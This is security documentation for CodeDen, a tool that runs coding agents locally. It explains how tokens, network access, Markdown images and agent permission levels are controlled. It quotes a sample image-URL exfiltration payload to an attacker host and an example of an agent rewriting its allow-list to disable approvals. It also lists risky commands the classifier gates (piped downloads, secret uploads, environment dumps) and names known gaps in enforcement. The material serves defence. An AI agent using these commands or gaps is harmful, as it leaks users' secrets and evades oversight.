# Security

CodeDen runs coding agents on your machine with your logins. Its security model keeps the local API private to you, keeps credentials out of files and transcripts, and puts risky agent actions in front of you before they happen.

To report a vulnerability, see [SECURITY.md](../SECURITY.md).

## Network

- By default the **server and the runner listen on 127.0.0.1 only.** Nothing is exposed to your LAN or the internet.
- **Network access is opt-in** (Settings › Network access, or `codeden network on`): it needs a password and then moves only the server's web listener to all interfaces on the same port, so phones and tablets on your network or VPN can sign in. The runner, its MCP proxy and the agents' `/mcp` endpoint stay on 127.0.0.1. See [Network access](#network-access) below and [Phones, tablets and network access](remote-access.md).
- **Every local request needs the install token**: a random 256-bit token in `~/.codeden/install-token`, created on first run (readable only by you where the OS supports file modes). It's required on every HTTP, WebSocket and MCP request, and compared in constant time.
- **The browser gets the token once**, through the launch URL that `codeden` opens. The server swaps it for an **HttpOnly, `SameSite=Strict` cookie** and redirects to a clean URL, so the token doesn't linger in your address bar or history. Opening CodeDen without it shows a "CodeDen is locked" page.
- **`Host` must be a loopback name** (`127.0.0.1`, `localhost`, `[::1]`), which blocks DNS-rebinding attacks.
- **`Origin`, when present, must be CodeDen's own**, which blocks other websites, including other apps on other localhost ports.
- The cookie name includes the port, so two installs side by side don't clash.
- **The browsers have no debugging port.** The runner's Chromium holds every session's tabs and cookies, so it opens no TCP port at all: the runner drives it over a private pipe, and nothing else on the machine (another session's agent, another OS user, a container reaching the host) can attach to it. The desktop app has no debugging port either; the runner reaches a session's native browser views through the app's relay on 127.0.0.1, one path per session, which needs that session's random secret, refuses web pages, and sees only that session's views.

### Network access

Off by default. When you turn it on:

- **A password is required.** At least 15 characters; very common passwords, repeats and simple sequences are refused. Only a **salted scrypt hash** is stored (`~/.codeden/remote-access.json`, mode 0600 where supported). CodeDen refuses to bind beyond 127.0.0.1 without one, at startup too. Changing it signs out every remote device.
- **Remote means "not loopback"**, judged from the connection's peer address (`127.0.0.0/8`, `::1` and their IPv4-mapped forms are local). `X-Forwarded-*`, `Forwarded` and `X-Real-IP` are never read.
- **Remote devices sign in with the password** and get a random session token in an **HttpOnly, `SameSite=Lax` cookie** (`Secure` over HTTPS), valid for 90 days. Only its SHA-256 hash is stored, with the device's user agent and when it was last seen. **The install token is never accepted from a remote device**, in a header, a cookie or `?token=`.
- **Failed sign-ins are throttled per address:** after three, each attempt waits 1 s, 2 s, 4 s … up to 30 s; ten in 15 minutes lock the address out for 15 minutes. Only failures count, other devices are unaffected, and each failure is logged with its address (never the password) in `~/.codeden/logs/remote-access.log`.
- **Reachable remotely, behind the session:** the web UI, the HTTP API and the UI WebSockets. **Never reachable remotely:** `/mcp` (404), the runner and its MCP proxy (still 127.0.0.1), and changing network access or the password (403; this computer or the CLI only).
- **`Host`** may also be one of this computer's own LAN or VPN addresses on CodeDen's port while access is on, and **`Origin`** may be the matching `http://<address>:<port>`. Other hosts, other ports, foreign origins and `null` origins are refused.
- **Signed-in devices** are listed in Settings with **Sign out** and **Sign out all**; signing out (or turning access off) also closes their open connections.
- Network access serves plain **http**: use it on networks you trust, or over your own VPN (Tailscale, WireGuard). Never forward the port to the internet.

## Markdown from agents and GitHub

Agent and PM replies, the orchestrator, plan approvals, factory inbox items, GitHub issue and pull request bodies and comments, and release notes are all Markdown that CodeDen didn't write. A prompt-injected agent (even a read-only PM) or a stranger's issue could add an image whose URL carries data, such as `![](https://attacker.example/?d=<secret>)`. A browser fetches an image the moment it's shown, so CodeDen never loads an image from another host on its own:

- **Remote images wait for you.** They show as a placeholder naming the image's host; hover it for the full URL. **Load image** loads that one image, at that exact URL, and it stays loaded until you reload the page. If the URL changes afterwards (say, the author of an issue edits its body), the placeholder comes back and the new image needs its own click. Images that never leave this machine show at once: inline `data:` and `blob:` images, and CodeDen's own stored files (`/api/artifacts/<id>` on CodeDen's own address). Other addresses on CodeDen's server, relative paths and other schemes are never loaded. `<picture>` sources are dropped, so they can't stand in for a held-back image.
- **Only your click fetches an image.** The policy below lets the page load images from CodeDen itself, so CodeDen's image fetch must not become a way around it: an `<img src="/api/remote-image?url=…">` that slipped into Markdown, or into any other HTML, would otherwise send its data out through CodeDen. The fetch takes two steps:
  1. **Load image** sends `POST /api/remote-image` with `{ "url": "<the image's URL>" }` as JSON, authorized like every other API call. An `<img>`, a link or a form can't send that request. The server answers a random, single-use id for that exact URL, valid for one minute.
  2. The image loads from `/api/remote-image/<id>`. The server fetches the URL the id was given for, once, and forgets the id. The browser shows the image again from its cache; after a reload, the image needs a new click.

  Anything else answers **404** and fetches nothing: `?url=`, an id that's unknown, expired or already used. The ids live in the server's memory only (at most 200 at a time), so a restart forgets them.
- **Loaded images come through CodeDen's server**, because the page itself may only load images from CodeDen (see the policy below). The server fetches only from **public internet addresses**, over https (an `http` image link is fetched as `https`), the same way as automation imports from a link. It never contacts this computer, your LAN, link-local, VPN (`100.64.0.0/10`) or other special ranges. Every address a name resolves to is checked when the server connects, so DNS can't point a name at them. The server sends no cookies, credentials or referrer. It follows at most three redirects, each checked the same way. It passes on only images (PNG, JPEG, GIF, WebP, AVIF, BMP, ICO, SVG) up to 10 MB, fetched within 15 seconds. It serves them like stored files: `nosniff` and a sandboxing policy, so an SVG opened on its own can't run script. Like every API route it needs the install token, or a signed-in device's session.
- **Links show where they go.** Clicking a link in Markdown opens a dialog with its real address, **Copy link** and **Open link**. Nothing opens until you choose. `javascript:` and `data:` links are refused and shown as plain text.
- **Content-Security-Policy.** The server sends this policy with the UI and with every other response that has no stricter one of its own, the "CodeDen is locked" page included:

  ```text
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:; font-src 'self' data:; media-src 'self' data: blob:;
  connect-src 'self' ws://<host> wss://<host>; worker-src 'self' blob:;
  object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
  ```

  Even if Markdown got an image past the renderer, the browser would refuse to load it from anywhere but CodeDen. The policy also allows no inline or remote script and no `eval`, keeps network requests and WebSockets on CodeDen, and stops other sites from framing the UI. Inline styles are allowed (UI components set them), but nothing can load through them from elsewhere. The desktop app sets the same policy on its window for everything from the server, alongside any policy the server sent. A server without one still gets it, and a stricter one, such as a stored file's, stays strict. The development UI that `pnpm dev` serves on Vite's port has no policy.

## Agents and MCP

- Each agent session gets its own **MCP token** for CodeDen's internal MCP server, minted when the session starts or resumes, **stored only as a SHA-256 hash**, and **revoked** when the session stops, completes or fails. The install token is not accepted on the MCP endpoint, and MCP tokens are not accepted by the UI API.
- Tokens are **role-scoped**: the orchestrator, PMs and agents see only the tools for their role; others aren't even listed. Browser tools always act on the caller's own session, and no tool takes another session's id.
- Agents reach CodeDen through a **local MCP proxy in the runner** on `127.0.0.1`. The token never goes on a command line, where any local process (and, on Linux and macOS, any other user of the computer) could read it:
  - **Claude Code** reads it from a private file, `~/.codeden/runner/mcp/session-<id>-<random>/mcp.json`, passed as `--mcp-config <file>`. Each session gets its own folder (mode 700, the file mode 600; on Windows, your profile's owner-only access), deleted when the session ends. Without a data folder it goes to a private folder in the OS temp directory instead.
  - **Codex** gets it over stdin (the thread's config).
  - **Cursor CLI** and **Gemini CLI** get it over stdin (the ACP `session/new` request).
  - **OpenCode** gets it in its server's environment (`OPENCODE_CONFIG_CONTENT`), which CodeDen removes from every command the agent runs. Other processes of your own user can read a process's environment, as they can your files.
  - CodeDen's own processes don't carry it either: the runner and `codeden runner-link` read the runner's token from its lock file, and git gets brokered credentials through its environment.
- **Other sessions' MCP configs always ask.** An agent holding another session's token could call CodeDen in that session's role (with a PM's or the orchestrator's: start sessions, edit automations, answer other agents' questions, raise a project's autonomy), so anything in `~/.codeden/runner/mcp` is guarded like CodeDen's own credential files (below), and `attach_evidence` and `share_to_chat` refuse it.
- **Agent environments** inherit your environment minus CodeDen's own variables: no `CODEDEN_*` variable (CodeDen's data folder, its installer, its secrets) reaches agents, terminals or setup scripts, so an agent can't find CodeDen's home through its environment and a CodeDen checkout's tests run against their own stubs. (Your other environment variables are passed through, as they would be in your own terminal.) Agent sessions also get **`CI=true`**, so no command waits on a prompt nobody can answer; your tools then behave as in CI. You can turn it off per project; see [Troubleshooting](troubleshooting.md#tests-installs-or-builds-behave-differently-in-agent-sessions).
- Tokens are never logged or written into transcripts.

## Runners

- The **home runner** runs next to the server on your machine and is trusted like the server. It is the only runner CodeDen connects today.
- **Sandbox runners** (runners in a container or a remote sandbox, coming with remote runners) share their sandbox with an agent that has a shell, so CodeDen treats everything they send as untrusted input. The server checks:
  - **Events against routing.** An event that names a session (agent output, turns, usage, approvals, provider crashes, checkpoints, setup output) is stored only when that session is routed to the runner that sent it. Anything else is dropped, logged and acknowledged, so a sandbox runner can't write into your other sessions.
  - **Terminals and the browser.** Terminal output and exits are shown only for terminals CodeDen opened on that runner, and browser frames, tabs and dialogs only for its own sessions, so a sandbox runner can't write into your other terminals or browser panels.
  - **Journal ids.** Each runner reports a journal id when it connects; it keys that runner's event stream and which sessions are sent to it. A runner reporting an id another runner already has is refused, so it can't stall or take over that runner's stream or its sessions. A sandbox runner's first id must also be new to CodeDen (no session or stored event uses it), and it must keep that id afterwards.

## The orchestrator and PMs can't write code

They always run read-only, whatever their level: Claude gets no edit tools and a policy that denies writing commands (checks included), Codex runs in a read-only sandbox, and OpenCode's, Cursor's and Gemini CLI's edits and writing commands are refused by CodeDen's policy (Cursor also runs in its read-only `ask` mode). They act only through CodeDen's tools.

## Permissions

Each agent session and each automation runs at a **permission level**, from Read-only to Full. The default comes from **Settings → Autonomy**; change it per session in the composer's **Permissions** picker (in a new session too, before its first message), and per automation in its editor. Each level maps onto the provider's **native** enforcement (the table below).

**Where a session's level comes from.** A session gets its level when it is created and keeps it: what you pick in the New session draft, else the project's default (the project's **Settings** tab, **Permissions**), else **Settings → Autonomy**. Changing either default only affects sessions started afterwards. A session that already exists, running or not, keeps the level it has, also when it is resumed, and a fork or a hand-off starts on its source's level. That holds in both directions: lowering the project's default doesn't lower a session that was created on a higher level. A session an automation starts gets the automation's level (the project's default when it names none, see [Automations](#automations)), and a review you start from another session is always Read-only. Sessions a PM or the factory starts name no level, so they take the project's default. The project's Settings tab lists the open sessions that are on another level than its default. To change a session's level, use the **Permissions** picker under its message box: that applies while it runs, from the agent's next tool call (Codex: from its next turn), and approvals already waiting stay waiting.

**Supervised asks about everything, reads included.** Under Supervised, every command needs your approval, also ones that only read (`git status`, `ls`, `grep`, `sed -n 1,40p file`). Pick **Auto** when you want those to run and only risky actions to ask. Under Auto a command that only reads still asks when what it reads is sensitive: a secrets file (`.env`, a key), an agent CLI's login, or anything in CodeDen's own home.

**The permission level is not the project's autonomy mode.** The [autonomy mode](software-factory.md) (Manual, Assisted, Software factory, Dark factory) decides who finds work and who merges. It never changes what a session asks about: a project in Assisted mode whose sessions run at Auto asks exactly as often as one in Manual mode. What a mode can change is who answers: in a Dark factory, an approval asked by the project's PM or one of the factory's own sessions is denied at once instead of waiting for you, never approved (see [Automations](#automations)). The two are set in different places and stored separately (`autonomy` and `autonomyMode` on a project).


| Level | Claude Code | Codex | OpenCode |
|---|---|---|---|
| **Read-only**: can read and run checks, but never edits files, commits or pushes | Default permission mode; a PreToolUse hook denies the edit tools and every shell command that is not on the read-only allowlist | `never` approvals, **read-only sandbox**, network off: writes fail instead of asking | Every edit is refused, and every command not on the read-only allowlist |
| **Supervised**: asks before edits and commands | Default permission mode, and every edit or command is routed to an approval | `untrusted` approvals, workspace-write sandbox | Every edit and command is routed to an approval |
| **Auto**: works freely in its worktree and asks only for risky actions (default) | `acceptEdits`, plus CodeDen's risk classifier on every tool call | `on-request` approvals, workspace-write sandbox, network off; what Codex asks to run outside its sandbox goes through CodeDen's risk classifier, and only risky actions reach you | CodeDen's risk classifier on every edit, command, outside path and fetch; only risky actions reach you |
| **Full**: never asks | `bypassPermissions`; only writes outside the worktree, CodeDen's own credential files, the agent CLIs' logins and [agents' own allow-lists](#agents-own-allow-lists) ask | `on-request` approvals, workspace-write sandbox, network on; CodeDen approves Codex's requests unless they write outside the worktree, touch CodeDen's own credential files or an agent CLI's login, or write an agent's allow-list | Only writes outside the worktree, CodeDen's own credential files, the agent CLIs' logins and agents' own allow-lists ask |

**How Codex's requests are decided.** Codex's workspace-write sandbox keeps `.git` read-only, and under Auto it keeps the network off, so Codex asks to step outside it for ordinary work such as `git commit`, `pnpm install` or `git push`. Under Auto and Full, CodeDen judges each request with the same risk classifier as Claude's tool calls: commands by their text, patches and extra folder permissions by their paths. What your level allows is approved at once and shows in the transcript as approved by policy; only the rest becomes an approval card. A command approved this way runs outside Codex's sandbox, just as Claude's commands run outside any sandbox. Relative paths resolve from the folder Codex runs the command in, and a command run in a folder outside the worktree (and outside its extra folders and temp) asks at Full too unless it only reads: `git clean -fdx` or `make clean` there changes that folder even though it names no path. OpenCode's and ACP agents' commands are judged the same way. Under Supervised and Read-only nothing is approved by policy.

OpenCode has no OS sandbox of its own. CodeDen gives its sessions permission rules that make every edit, command, path outside the worktree and web fetch ask, and answers each request with its own policy, the same classifier Claude uses: approved on the spot, refused with a reason, or shown to you. **Approve for session** is kept by CodeDen for that session only: OpenCode's own "always" would save the rule for every session in the repository, so CodeDen never sends it. The OpenCode server CodeDen starts listens on `127.0.0.1` with a random password, and a small plugin removes that password (and the config carrying CodeDen's MCP token) from the environment of the agent's shell commands.

Cursor's CLI asks before the tool calls its own rules gate, over its ACP server (`agent acp`), and CodeDen decides each request by level exactly as for OpenCode, with the same classifier. CodeDen never starts it with `--force`, and only ever answers "once": Cursor's "always" option would save the rule in your Cursor settings. Known gap: what Cursor's own allowlist (`~/.cursor/cli-config.json`, a project's `.cursor/cli.json`) allows runs without asking, so CodeDen only sees what Cursor asks about. Cursor has no option to ignore a project's allowlist, so CodeDen guards the file instead (below).

Gemini CLI works the same way over its ACP server (`gemini --acp`). CodeDen runs it in its `default` mode, which asks before every edit, command and MCP tool, switches a session that opens in your `yolo` or `autoEdit` default back to it, and never passes `--yolo` or `--approval-mode`. Gemini CLI names the MCP server of each tool it asks about, which is how CodeDen recognises its own tools; a command or an edit is judged as one whatever it is called. CodeDen also starts it with an **admin policy** (`--admin-policy`, the file `gemini/admin-policy.toml` in CodeDen's data folder). Admin rules outrank everything Gemini CLI's settings and your own policy files allow (`tools.allowed`, MCP servers marked `trust` or listed in `mcp.allowed`), so commands always ask, and edits and MCP tools ask outside plan mode, and CodeDen decides each one. Known gap: other tools those settings allow (web fetches, for example) still run without asking, and so do edits and MCP tools they allow while Gemini CLI plans, where its own plan rules decide. Gemini CLI ignores `--admin-policy` when your machine has system policies of its own.

**Your own Gemini CLI deny rules still apply.** Admin rules would outrank what you *deny* in Gemini CLI too, so CodeDen repeats your rules for commands, edits and MCP tools in a second admin file (`gemini/user-rules-<hash>.toml`), above its own and in Gemini CLI's own order. It reads them from your `~/.gemini/policies`, the project's `.gemini/policies`, and `tools.exclude`, `tools.allowed`, `mcp.excluded`, `mcp.allowed` and trusted MCP servers in your and the project's `settings.json`. What they deny stays denied at every level, Full included: a Gemini CLI rule that denies `git push --force` stops it in a CodeDen session too. What they allow asks instead, and CodeDen decides, including an exception you carved out of a deny. CodeDen applies the project's policy files even though current Gemini CLI releases don't load them yet; they rank below your own rules, so they can only deny or ask. Deny rules from Gemini CLI extensions, system settings or `policyPaths` aren't repeated: for those calls CodeDen's permission level decides.

### Agents' own allow-lists

An agent could switch CodeDen's approvals off by writing its own allow-list. A single step like `echo '{"permissions":{"allow":["Shell(*)"]}}' > .cursor/cli.json` would do it, and once merged it would apply to every later Cursor session in the project. So creating or changing one of these files asks at **every** level, Full included, in every edit and command CodeDen judges (Claude Code's, OpenCode's, Cursor's and Gemini CLI's, and what Codex asks to run outside its sandbox):

- Cursor: `.cursor/cli.json`, and `cli-config.json` in `.cursor` (your `~/.cursor`) or a `cursor` config folder.
- Gemini CLI: `settings.json` and `trustedFolders.json` in `.gemini` (the project's or your `~/.gemini`), the system `settings.json` and `system-defaults.json` in `gemini-cli`, and any policy file in `.gemini/policies` or `gemini-cli/policies`.
- Copying or moving something into a `.cursor` or `.gemini` folder.

This covers the agent's edit tools and shell writes: redirects (`>`, `>>`), `tee`, `cp`, `mv`, `ln`, `dd of=`, `sed -i`, `git checkout`/`restore`/`mv`, PowerShell's `Set-Content`, `Out-File`, `Copy-Item`, `New-Item` and `[IO.File]` calls, and inline code (`node -e`, `python -c`) that names one. Reading, searching, diffing, staging or deleting them doesn't ask.

Known gaps:
- **Codex** edits files and runs commands inside its workspace-write sandbox without asking, at Auto and Full. Those writes never reach CodeDen, so a Codex session can write one of these files in its worktree; only what Codex asks to run outside its sandbox is judged.
- **Paths CodeDen can't read from the command**, such as one built while it runs (`> $f`), or a program that writes the file itself.

That's why CodeDen also checks at the start of each session. When a Cursor or Gemini CLI session starts in a worktree that already has rules like these (`permissions.allow` in `.cursor/cli.json`; `tools.allowed`, `tools.autoAccept`, `mcp.allowed` or a trusted MCP server in `.gemini/settings.json`; `allow` rules in `.gemini/policies/*.toml`), its first turn shows a warning naming them. For a factory session, the warning also goes on the factory item and into your inbox, since nobody may be watching the transcript. Check such rules before relying on CodeDen's levels: they may have come in with a merged change.

Read-only is offered only on providers that report the `readOnly` capability (Claude Code, Codex, OpenCode, Cursor and Gemini CLI all do); the server refuses it elsewhere. Under Read-only:

- **Claude** may run commands that only read (`ls`, `cat`, `rg`, `cd`, `sed` scripts that only print such as `sed -n 1,40p`, `git status`/`log`/`diff`/`show`/`stash list` including `git -C <dir> …`, `gh ... view`/`list`/`checks`, `gh search`, `gh api` GET requests, and their PowerShell equivalents) and the project's **checks**: `npm`/`pnpm`/`yarn`/`bun` `test`, `lint`, `typecheck` or `check`, `tsc`, `vitest`, `jest`, `eslint`, `biome check`, `ruff check`, `pytest`, `mypy`, `cargo test`/`check`/`clippy` and `go test`/`vet`. Fix, write, snapshot-update and watch flags (`--fix`, `--write`, `-u`, `--watch`, ...), output redirection and command substitution are refused, and so are the options that make a reading program write or run something (`sort -o`, Windows `sort /O[UTPUT]` and `/T[EMPORARY]`, `uniq` with an output file, `find -fprint`/`-exec`, also after `--`, `fd -x`, `rg --pre`, `less -o`, `tree -o`, `date -s`, `git diff --output`, `git grep -O`, `git ls-remote --upload-pack`), git's writing forms (creating a branch or tag by name, `git remote`/`worktree`/`reflog` changes, `git config` writes, abbreviations included), `gh` verbs other than view, list, status, diff and checks (and `gh` extensions), unquoted parentheses and braces (PowerShell runs code in them, even after an allowed cmdlet), background jobs (`&`), installs, builds, commits and pushes. Options are read from the words the shell actually passes (`-'o'` is `-o`); variable expansion, `$'…'` quoting and unquoted patterns that could expand to an option are refused, since what they pass can't be read from the command. Checks run the project's own scripts, so a test that writes files (coverage, caches) can still write them; the agent itself cannot.
- **Codex** runs every command in its read-only sandbox, so checks run but any write fails.
- **OpenCode** follows the same allowlist as Claude: commands that only read and the project's checks run; edits and every other command are refused with the reason, which the agent sees.
- **Cursor** runs in its read-only `ask` mode, and CodeDen's policy refuses edits and commands outside the same allowlist.
- **Gemini CLI** stays in its `default` mode, which asks before every edit and command, and CodeDen's policy refuses edits and commands outside the same allowlist.
- **CodeDen's `create_pull_request`** is hidden from read-only sessions and refused if called. Commenting on issues and attaching screenshots as evidence still work, so the agent can report what it found.

Changing the level while a session runs is saved on the session and sent to the running agent. Claude, OpenCode, Cursor and Gemini CLI follow it from their next tool call, into and out of Read-only too; Codex from its next turn (the composer tells you which). Approvals that are already waiting stay waiting.

### Plan mode

**Plan** in the composer (in a new session too, before its first message) has the agent plan before it builds. While it plans, CodeDen refuses file edits and writing commands at **every** level, Full included, with the same command rules as Read-only: the agent can read, search and run the project's checks, and write only its own plan notes (Claude's plans folder), at Read-only too (under Supervised that write still asks). Claude Code's own plan mode would otherwise send edits to CodeDen's approval policy, which Auto and Full approve, so CodeDen enforces it itself. The plan ends in a **Plan ready** card: approving lets the agent implement at the session's permission level, and **Keep planning** sends your note back so it revises the plan. Turning Plan off without approving returns the session to its permission level straight away.

Cursor and Gemini CLI plan in their own `plan` modes, with the same refusals from CodeDen. Gemini CLI's plan ends when it asks to leave plan mode (`exit_plan_mode`): CodeDen shows its plan file and the **Plan ready** card. Gemini CLI can't take a note with **Keep planning**, so send what to change as your next message. While planning, any other tool Gemini CLI asks about that CodeDen can't identify goes to you at every level.

## Automations

Automations run unattended, so they use the same permission levels with safer defaults around them: new, imported and PM-created automations always start **off**, an import never runs anything and warns about Full permissions, and imports are parsed with the same validation as automation files, within limits on file count and size. See [Automations](automations.md#sharing-export-and-import).

A PM can't turn an automation you switched on into something else behind your back. When it changes the trigger, the action (prompt, agent, permissions) or the guards of an automation that's on, the automation is switched off in the same change and your inbox lists what changed; it runs again only once you switch it on. Renaming it or changing its description keeps it on. Automations for all projects and automations defined in files can't be changed by the PM at all. See [From the PM](automations.md#create-an-automation).

**Nor can a change to an automation's file.** A project's `.codeden/automations/*.md` can be rewritten by an agent working in the project or by a merged pull request. When the file of an automation that's on changes the same things (trigger or schedule, prompt, permissions, agent, guards), CodeDen switches it off when it reloads the file and raises one inbox item, "Automation *name* changed in its file: review and turn it back on", with a diff of the old and new definition. The same goes for a file in `~/.codeden/automations/`, and the projects that switched it on follow its own switch again. A new name or description keeps it on. An agent's write to these files asks at Auto (see below).

**An automation never runs above the level you approved.** Switching an automation on records its permission level as the one you approved. Runs you don't start yourself (its schedule, events, catch-up, the PM's `run_automation`, issue triage starting work) get the level the automation asks for, capped at that approval, so a file that later asks for Full still runs at what you approved until you switch it on again. An automation nobody switched on runs no higher than the project's default level when the PM runs it. **Run now** on the Automations page is you starting it, so it runs as defined. Automations switched on before this was recorded run as defined until their next change switches them off.

**The OS temp directory counts as part of the workspace** under Auto and Full: writing or deleting files in `os.tmpdir()`, `%TEMP%`/`%TMP%`, `$TMPDIR` or `/tmp` (including Git Bash's `/tmp` on Windows) doesn't ask, and Codex's sandbox may write there. Only the temp directories themselves qualify, never a filesystem root or your home directory, even if an environment variable points there. Secrets files written to temp still ask, and Supervised still asks for everything.

**Claude's own notes count the same way.** For Claude sessions under Auto and Full, writing plan files (plan mode, `~/.claude/plans` or your `plansDirectory`) and the project's auto-memory (`~/.claude/projects/<project>/memory` or your `autoMemoryDirectory`) doesn't ask. Only your own Claude settings can move these folders (a repository's settings can't), and a folder that would cover Claude's config folder (its settings and credentials), your home directory or a filesystem root is ignored. Claude's settings and credentials, and secrets files, still ask.

Under **Auto**, edits and ordinary commands inside the worktree run freely, and these go to an approval card (and your inbox):

- writes or deletes **outside the worktree** (and outside the OS temp directory), and changes to global git config (reading it, such as `git config --global user.email`, doesn't ask). A delete that takes its paths from a pipe (`Get-ChildItem C:\Users | Remove-Item -Recurse`, `… | ForEach-Object { Remove-Item $_ }`, `find ~ -name '*.log' | xargs rm`) counts as deleting what the command at the head of the pipeline names, or the folder it lists when it names none. So does a search that deletes what it finds (`find ~/old -delete`, `find ~/old -exec rm {} +`, `-execdir`/`-ok rm`, `fd . ~/old -X rm`): it deletes in the folders it searches, the current folder when it names none. Deleting a registry key or value or a certificate (`Remove-Item HKCU:\Software\Foo -Recurse`, `Registry::…`, `Cert:\…`, `Remove-ItemProperty HKCU:\… -Name X`, `reg delete HKCU\Software\Foo /f`) always asks, while deleting from the shell's own `Env:`, `Variable:`, `Function:` and `Alias:` drives doesn't. Where a PowerShell download saves its file counts as a write, as `Set-Content` does: `Invoke-WebRequest` and `Invoke-RestMethod` (`iwr`, `irm`, and Windows PowerShell's `curl` and `wget` aliases) with `-OutFile`, and `Start-BitsTransfer` with `-Destination` (named or after the source). So does assigning to PowerShell's variable syntax for a file, `${C:\Users\me\.bashrc} = '…'` or `+=`, which writes the file. Saved in the worktree or temp (`-OutFile .\vendor\x.zip`, `-OutFile $env:TEMP\x.zip`), they run freely, and fetching itself is judged as before;
- **force pushes**, deleting branches with unmerged work (`git branch -D`), tags or refs, and deleting remote branches. A force push **with a lease** of the session's own branch (`git push --force-with-lease` after a rebase, to the branch of its own worktree) doesn't ask: the lease refuses if someone else pushed there since, and it never applies to the base branch or `main`/`master`. `git branch -d`, which refuses to delete unmerged work, doesn't ask either. `create_pull_request` pushes the session's own branch with a lease when a plain push is rejected after a rebase;
- **global installs** (`npm -g`, `pip` outside a project, system package managers) and elevated commands (`sudo`);
- **piping a downloaded script into a shell** or executing a download (`curl … | sh`, `irm … | iex`, `curl … | cmd`, `curl … | python3`). Piping a download into a program that only reads it as data, such as `node -e '…'`, `python -c '…'`, `jq` or a script file in the project, runs freely;
- **secrets access**: reading secrets files (`.env`, `.npmrc`, SSH keys, `*.pem`, ...), including through PowerShell's variable syntax for a file (`${C:\Users\me\.ssh\id_rsa}` as a value, in a double-quoted string or in an `@"…"@` here-string, whatever the command; `${env:PATH}` and other variables are not files), uploading one (`curl -F file=@.env`, `--data-binary @.env`) and dumping the environment (`printenv`, bare `env`, `set`, `export -p`, `Get-ChildItem env:`, `[Environment]::GetEnvironmentVariables()`, `node -e` or `python -c` code that prints `process.env` or `os.environ` whole, reading `/proc/self/environ`). Listing only the names (`compgen -e`, `printenv -0 | cut -z -d= -f1`, `Get-ChildItem env: -Name`, `Get-ChildItem env: | Where-Object { $_.Name -like 'CODEDEN*' } | Select-Object -ExpandProperty Name`) and running a command through `env` (`env -u NAME pnpm test`) don't ask. A listing still asks when it could print values after all: cutting lines at `=` (`printenv | cut -d= -f1`, `sed`, `awk`, cmd's `for /f "delims=="`) passes on the other lines of a value that spans several, such as a private key; a `Where-Object` or `Sort-Object` script block that does more than compare can print each entry (`{ Write-Host $_ }`); and `-OutVariable v` keeps the entries for a later `$v`. Searching for a pattern such as `process.env`, mentioning a file name (`echo .env >> .gitignore`), checking that one exists, listing them, and creating or editing one inside the worktree (`cp .env.example .env`) are not reads and run freely. Printing a named variable such as `printenv PATH` doesn't ask either, unless its name looks like a credential. Writing a secrets file outside the worktree, temp included, asks as a write outside the worktree, under Full too;
- network fetches to hosts not on the allowed list, where a list applies;
- **CodeDen's own project files**: `.codeden/project.json` (setup and check commands that run in later sessions), the automation files in `.codeden/automations/` (what each automation runs, with which permissions and when) and `.codeden/VISION.md` (the factory's vision and protected areas). Edits and shell writes (redirects, `tee`, `cp`, `sed -i`, `git checkout --`, `Set-Content`, inline code that names one, a copy into the folder) ask; reading, diffing and staging them, and other files in `.codeden` such as `notes.md`, don't. Only the default vision path is covered: a project whose vision lives elsewhere isn't. Like the allow-lists above, Codex's own sandboxed writes aren't seen.

These are judged wherever they sit in a command line: in a pipeline, a substitution, a shell's inline script (`bash -c "…"`, `pwsh -Command …`, `cmd /c …`) and a cmd `for` loop. For a loop that means the command `for /f` reads (`for /f "tokens=*" %i in ('set AWS') do @echo %i` asks like `set AWS`, and so does `('"set AWS"')`, since `cmd /c` drops the outer quotes), the files it reads (`for /f %i in (.env)`) and the command after `do`. cmd's `@` before a command (`@set AWS`) doesn't hide it either. Nor does a PowerShell assignment: the command on its right (`$r = Remove-Item C:\… -Recurse`, `[string]$x = …`, `$x += …`, `$a, $b = …`, `$null = …`, `[void](…)`, `$x = $(…)`) is judged exactly as if it stood alone, every stage of its pipe included, while a plain value (`$a = 1`, `$s = "text"`, `$h = @{ a = 1 }`) runs freely. A path kept in a variable is still checked by every rule about paths (secrets, CodeDen's own home and credentials, the agent CLIs' logins, agents' allow-lists and the project config), since a later command reads or writes it through the variable: `$p = '.env'` asks, and `$t = '<CodeDen home>\install-token'; Get-Content $t` or `$p = '.cursor\cli.json'; Set-Content $p …` asks at every level, Full included. The program `Start-Process` (`saps`, `start`) or cmd's `start` starts is judged like the same command run directly, also after a title and `start`'s switches (`start "" /b reg add …`, `start /b "" reg add …`, `start "" /d C:\ cmd /c …`); when it starts a shell, its argument list is that shell's script (`Start-Process powershell -ArgumentList '-c','irm … | iex'` asks like `irm … | iex`).

A folder change counts for the relative paths after it: `cd`, `pushd`/`Push-Location`, and `popd`/`Pop-Location`, which goes back only when it really pops. Shells disagree on a pop given arguments (bash's `popd -n` stays where it is, PowerShell refuses a parameter it doesn't know, cmd ignores them and pops), and `dirs -c` empties only bash's stack, so what follows such a pop is judged both where it stays and where it would go back to.

When you approve, you can approve once or for the rest of the session.

**CodeDen's own home always asks.** CodeDen keeps everything in its home (`~/.codeden`, or the folder `CODEDEN_HOME` names). Its credential files, the install token (`install-token`), the runner's lock file with the runner's token (`runner/runner.json`) and the network access store (`remote-access.json`), would let an agent drive CodeDen itself and approve its own requests. The same goes for the copy CodeDen keeps of a damaged one before resetting it (`remote-access.json.invalid-<timestamp>`, next to the file), and for the sessions' private MCP configs (anything in `runner/mcp`), whose tokens would let an agent act as another session. The rest of the home would show an agent other sessions' work: the database (`codeden.db` and its `-wal` and `-shm` files) holds every session's transcript, inbox items and MCP token hashes, and the home also holds settings, logs, backups and other sessions' worktrees. So reading, writing, deleting, copying or listing anything in the home, or a wildcard that matches anything there, asks at **every** level, Full included, and is refused for Read-only sessions, the orchestrator and PMs. So does searching the home, or a folder above it recursively, whatever the search's name filters (a filter can only leave out the credential files: other sessions' worktrees hold every kind of file). A listing from a folder above the home that only shows names (`find ~ -name '*.db'`, `ls -R ~`) doesn't ask until the names feed another command. The exceptions are the session's own folders in the home: its worktree under `wt/` (the orchestrator's `orchestrator/`) works as usual, while another session's worktree asks. For reading only, so does its own artifacts folder, `artifacts/<session id>`, where its screenshots and pasted images are kept: the session can open the `File:` path `browser_screenshot` prints (Claude's Read, `cat`, `Get-Content`), list that folder or search it without asking. Reading counts when the command only reads: a program read-only sessions may run, without an option that writes or runs something (`sort -o`, `find -delete`, `find -exec`), and whose output doesn't feed another command (`ls … | xargs rm` asks). Writing, copying or deleting there still asks, because artifacts are created through CodeDen's tools, and so do the artifacts folder itself, `.incoming`, other sessions' artifacts, and wildcards or searches that reach past the session's own folder 